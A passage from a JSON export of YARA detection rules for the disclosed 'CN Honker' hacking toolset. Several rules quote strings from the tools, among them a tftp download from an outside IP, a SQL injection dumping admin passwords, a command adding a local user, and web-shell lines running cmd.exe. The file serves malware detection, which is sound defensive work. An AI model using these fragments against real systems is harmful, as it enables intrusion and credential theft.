minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"LogCleaner.exe <ip> [Logpath]\" fullword ascii\n      $s3 = \"http://l-y.vicp.net\" fullword ascii\n   condition: \n      filesize < 7KB and all of them\n}","date":"2015-06-23 14:59:11","description":"Script from disclosed CN Honker Pentest Toolset - file readme.txt","minimum_yara":"1.7","name":"CN_Honker_IIS_logcleaner1_0_readme_RID33B4","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"b2cc05e476d13ae0015581dfca3d978e","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_Alien_command_RID2FEE : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file command.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:18:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /d %i in (E:\\\\freehost\\\\*) do @echo %i\" fullword ascii\n      $s1 = \"/c \\\"C:\\\\windows\\\\temp\\\\cscript\\\" C:\\\\windows\\\\temp\\\\iis.vbs\" fullword ascii\n   condition: \n      filesize < 8KB and all of them\n}","date":"2015-06-23 12:18:11","description":"Script from disclosed CN Honker Pentest Toolset - file command.txt","minimum_yara":"1.7","name":"CN_Honker_Alien_command_RID2FEE","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a578d7d9d9c982c9e1826b11e9116770","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_portRecall_bc_RID3003 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file bc.pl\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"print \\\"[*] Connected to remote host \\\\n\\\"; \" fullword ascii\n      $s1 = \"print \\\"Usage: $0 [Host] [Port] \\\\n\\\\n\\\";  \" fullword ascii\n      $s5 = \"print \\\"[*] Resolving HostName\\\\n\\\"; \" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}","date":"2015-06-23 12:21:41","description":"Script from disclosed CN Honker Pentest Toolset - file bc.pl","minimum_yara":"1.7","name":"CN_Honker_portRecall_bc_RID3003","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"87669dde2d5deeec17bb86b1190bbce6","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_Tuoku_script_MSSQL__RID3221 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file MSSQL_.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:52:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetLoginCookie = Request.Cookies(Cookie_Login)\" fullword ascii\n      $s2 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\\\"\" fullword ascii\n      $s8 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n   condition: \n      filesize < 100KB and all of them\n}","date":"2015-06-23 13:52:01","description":"Script from disclosed CN Honker Pentest Toolset - file MSSQL_.asp","minimum_yara":"1.7","name":"CN_Honker_Tuoku_script_MSSQL__RID3221","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"0aa5ec33cf0f847fa8486d04028448b9","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_nc_MOVE_RID2D2E : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file MOVE.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:20:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Destination: http://202.113.20.235/gj/images/2.asp\" fullword ascii\n      $s1 = \"HOST: 202.113.20.235\" fullword ascii\n      $s2 = \"MOVE /gj/images/A.txt HTTP/1.1\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 10:20:51","description":"Script from disclosed CN Honker Pentest Toolset - file MOVE.txt","minimum_yara":"1.7","name":"CN_Honker_nc_MOVE_RID2D2E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ef67fd7b388cf8b92ff956ed506c4192","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_mssqlpw_scan_RID2FE2 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file mssqlpw scan.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:16:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.Write(\\\"I Get it ! Password is <font color=red>\\\" & str & \\\"</font><BR>\" ascii\n      $s1 = \"response.Write \\\"Done!<br>Process \\\" & tTime & \\\" s\\\"\" fullword ascii\n   condition: \n      filesize < 6KB and all of them\n}","date":"2015-06-23 12:16:11","description":"Script from disclosed CN Honker Pentest Toolset - file mssqlpw scan.txt","minimum_yara":"1.7","name":"CN_Honker_mssqlpw_scan_RID2FE2","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"6373161c00c79b67bf029bef1d7450fe","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_MAC_IPMAC_RID2D61 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file IPMAC.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Http://Www.YrYz.Net\" fullword wide\n      $s2 = \"IpMac.txt\" fullword ascii\n      $s3 = \"192.168.0.1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 267KB and all of them\n}","date":"2015-06-23 10:29:21","description":"Sample from CN Honker Pentest Toolset - file IPMAC.exe","minimum_yara":"1.7","name":"CN_Honker_MAC_IPMAC_RID2D61","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"21154473a107a2b505ab3dbcb440809e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_GetSyskey_RID2E6F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetSyskey.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:14:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"GetSyskey <SYSTEM registry file> [Output system key file]\" fullword ascii\n      $s4 = \"The system key file \\\"%s\\\" is created.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}","date":"2015-06-23 11:14:21","description":"Sample from CN Honker Pentest Toolset - file GetSyskey.exe","minimum_yara":"1.7","name":"CN_Honker_GetSyskey_RID2E6F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"d41d6e0c95fa2041f348a294c1ee678d","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Churrasco_RID2E71 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Churrasco.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:14:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"HEAD9 /\" ascii\n      $s1 = \"logic_er\" fullword ascii\n      $s6 = \"proggam\" fullword ascii\n      $s16 = \"DtcGetTransactionManagerExA\" fullword ascii\n      $s17 = \"GetUserNameA\" fullword ascii\n      $s18 = \"OLEAUT\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1276KB and all of them\n}","date":"2015-06-23 11:14:41","description":"Sample from CN Honker Pentest Toolset - file Churrasco.exe","minimum_yara":"1.7","name":"CN_Honker_Churrasco_RID2E71","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f9eac44e10432afe187c3d824126571e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_mysql_injectV1_1_Creak_RID3335 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file mysql_injectV1.1_Creak.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"1http://192.169.200.200:2217/mysql_inject.php?id=1\" fullword ascii\n      $s12 = \"OnGetPassword\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5890KB and all of them\n}","date":"2015-06-23 14:38:01","description":"Sample from CN Honker Pentest Toolset - file mysql_injectV1.1_Creak.exe","minimum_yara":"1.7","name":"CN_Honker_mysql_injectV1_1_Creak_RID3335","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"8a2e7acbcb75725dee4fb4cd5f8eec6c","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ASP_wshell_RID2E99 : DEMO FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wshell.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:21:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n      $s1 = \"UserPass=\" \n      $s2 = \"VerName=\" \n      $s3 = \"StateName=\" \n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 200KB and all of them\n}","date":"2015-06-23 11:21:21","description":"Sample from CN Honker Pentest Toolset - file wshell.txt","minimum_yara":"1.7","name":"CN_Honker_ASP_wshell_RID2E99","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"37333cf7858bfcad17ba308d63d0adc3","score":70,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_exp_iis7_RID2DEF : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file iis7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:53:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\\\\\localhost\" fullword ascii\n      $s1 = \"iis.run\" fullword ascii\n      $s3 = \">Could not connecto %s\" fullword ascii\n      $s4 = \"WinSta0\\\\Default\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}","date":"2015-06-23 10:53:01","description":"Sample from CN Honker Pentest Toolset - file iis7.exe","minimum_yara":"1.7","name":"CN_Honker_exp_iis7_RID2DEF","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"e8d661ec9f1384e25abc1d97e759b076","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_SegmentWeapon_RID3004 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SegmentWeapon.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:21:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\WINDOWS\\\\system32\\\\msvbvm60.dll\\\\3\" fullword ascii\n      $s1 = \"http://www.nforange.com/inc/1.asp?\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-23 12:21:51","description":"Sample from CN Honker Pentest Toolset - file SegmentWeapon.exe","minimum_yara":"1.7","name":"CN_Honker_SegmentWeapon_RID3004","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f14a56e4544b6ff3f1d47dd54c54ab36","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Alien_iispwd_RID2F9F : DEMO HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file iispwd.vbs\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"set IIs=objservice.GetObject(\\\"IIsWebServer\\\",childObjectName)\" fullword ascii\n      $s1 = \"wscript.echo \\\"from : http://www.xxx.com/\\\" &vbTab&vbCrLf\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}","date":"2015-06-23 12:05:01","description":"Sample from CN Honker Pentest Toolset - file iispwd.vbs","minimum_yara":"1.7","name":"CN_Honker_Alien_iispwd_RID2F9F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"0092b5dbe604d712a1465a8ecf29296a","score":70,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Md5CrackTools_RID2FA2 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Md5CrackTools.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:05:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s2 = \",<a href='index.php?c=1&type=md5&hash=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4580KB and all of them\n}","date":"2015-06-23 12:05:31","description":"Sample from CN Honker Pentest Toolset - file Md5CrackTools.exe","minimum_yara":"1.7","name":"CN_Honker_Md5CrackTools_RID2FA2","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"da0c623f332e24c73af0ade9787662cd","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_CoolScan_scan_RID2FDD : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file scan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:15:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"User-agent:\\\\s{0,32}(huasai|huasai/1.0|\\\\*)\" fullword ascii\n      $s1 = \"scan web.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3680KB and all of them\n}","date":"2015-06-23 12:15:21","description":"Sample from CN Honker Pentest Toolset - file scan.exe","minimum_yara":"1.7","name":"CN_Honker_CoolScan_scan_RID2FDD","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"25b73bc9ccf106df29619f08b40a135b","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_COOKIE_CooKie_RID2F1A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CooKie.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:42:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"-1 union select 1,username,password,4,5,6,7,8,9,10 from admin\" fullword ascii\n      $s5 = \"CooKie.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 360KB and all of them\n}","date":"2015-06-23 11:42:51","description":"Sample from CN Honker Pentest Toolset - file CooKie.exe","minimum_yara":"1.7","name":"CN_Honker_COOKIE_CooKie_RID2F1A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"abc063f2415e933d473b5f14c8842e3b","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_wwwscan_1_wwwscan_RID31CA : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wwwscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:37:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n      $s3 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}","date":"2015-06-23 13:37:31","description":"Sample from CN Honker Pentest Toolset - file wwwscan.exe","minimum_yara":"1.7","name":"CN_Honker_wwwscan_1_wwwscan_RID31CA","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"d81a41bb742536080fc7c167784fc520","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_D_injection_V2_32_RID30D8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:57:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Missing %s property(CommandText does not return a result set{Error creating obje\" wide\n      $s1 = \"/tftp -i 219.134.46.245 get 9493.exe c:\\\\9394.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}","date":"2015-06-23 12:57:11","description":"Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe","minimum_yara":"1.7","name":"CN_Honker_D_injection_V2_32_RID30D8","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"30d27a67dfea907898bc4d17fd038230","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_net_priv_esc2_RID2FFA : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file net-priv-esc2.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:20:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:%s username password\" fullword ascii\n      $s2 = \"<www.darkst.com>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 17KB and all of them\n}","date":"2015-06-23 12:20:11","description":"Sample from CN Honker Pentest Toolset - file net-priv-esc2.exe","minimum_yara":"1.7","name":"CN_Honker_net_priv_esc2_RID2FFA","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"915fa4c9f8beff55765cea116d7fc342","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Oracle_v1_0_Oracle_RID3167 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Oracle.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"!http://localhost/index.asp?id=zhr\" fullword ascii\n      $s2 = \"OnGetPassword\" fullword ascii\n      $s3 = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3455KB and all of them\n}","date":"2015-06-23 13:21:01","description":"Sample from CN Honker Pentest Toolset - file Oracle.exe","minimum_yara":"1.7","name":"CN_Honker_Oracle_v1_0_Oracle_RID3167","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"e3156d6334bfd7ab5ca2650ce93f7ad1","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Interception_RID2FBB : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Interception.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:09:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \".\\\\dat\\\\Hookmsgina.dll\" fullword ascii\n      $s5 = \"WinlogonHackEx \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and all of them\n}","date":"2015-06-23 12:09:41","description":"Sample from CN Honker Pentest Toolset - file Interception.exe","minimum_yara":"1.7","name":"CN_Honker_Interception_RID2FBB","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f59f2b0644100a79abcd672a10c52b85","score":70,"tags":["EXE","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_DUBrute_v3_0_RC3_3_0_RID3419 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 3.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:16:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"explorer.exe http://bbs.yesmybi.net\" fullword ascii\n      $s1 = \"LOADER ERROR\" fullword ascii\n      $s9 = \"CryptGenRandom\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 395KB and all of them\n}","date":"2015-06-23 15:16:01","description":"Sample from CN Honker Pentest Toolset - file 3.0.exe","minimum_yara":"1.7","name":"CN_Honker_sig_3389_DUBrute_v3_0_RC3_3_0_RID3419","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"173dc7094664c72cad3a32afdea62c0c","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_windows_exp_RID2F7E : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file exp.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:59:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n      $s8 = \"OH,Sry.Too long command.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them\n}","date":"2015-06-23 11:59:31","description":"Sample from CN Honker Pentest Toolset - file exp.exe","minimum_yara":"1.7","name":"CN_Honker_windows_exp_RID2F7E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"8ac1bacebfe7f053811f70110c8dd9e6","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_safe3wvs_cgiscan_RID3130 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file cgiscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:11:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"httpclient.exe\" fullword wide\n      $s3 = \"www.safe3.com.cn\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 357KB and all of them\n}","date":"2015-06-23 13:11:51","description":"Sample from CN Honker Pentest Toolset - file cgiscan.exe","minimum_yara":"1.7","name":"CN_Honker_safe3wvs_cgiscan_RID3130","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5f8b90d2fa5e89e046d93068f1e7629e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_pr_debug_RID2E0F : DEMO EXE FILE HKTL T1087 T1136 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file debug.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:58:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1087, T1136\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-->Got WMI process Pid: %d \" ascii\n      $s2 = \"This exploit will execute \\\"net user temp 123456 /add & net localg\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 820KB and all of them\n}","date":"2015-06-23 10:58:21","description":"Sample from CN Honker Pentest Toolset - file debug.exe","minimum_yara":"1.7","name":"CN_Honker_pr_debug_RID2E0F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"3644fcded9c45045362400d3b87dfa75","score":70,"tags":["T1136","T1087","DEMO","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_T00ls_Lpk_Sethc_v4_0_RID31CE : DEMO EXE FILE HKTL T1015 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v4.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:38:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, 